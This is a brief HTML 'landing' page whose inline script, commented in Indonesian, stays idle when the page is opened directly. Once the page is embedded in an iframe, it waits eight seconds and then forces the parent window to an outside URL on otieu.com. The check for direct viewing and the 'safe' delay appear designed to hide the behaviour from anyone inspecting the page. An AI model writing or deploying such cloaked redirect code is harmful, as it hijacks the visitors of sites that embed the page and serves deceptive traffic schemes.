<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Landing</title>
</head>
<body>

<h1>landing-redirect</h1>

<script>
(function () {

  // Jangan redirect kalau dibuka langsung
  if (window.self === window.top) return;

  // Delay aman untuk iframe traffic
  setTimeout(function () {
    try {
      window.top.location.replace("https://otieu.com/4/9620599");
    } catch (e) {
      window.location.href = "https://otieu.com/4/9620599";
    }
  }, 8000);

})();
</script>

</body>
</html>
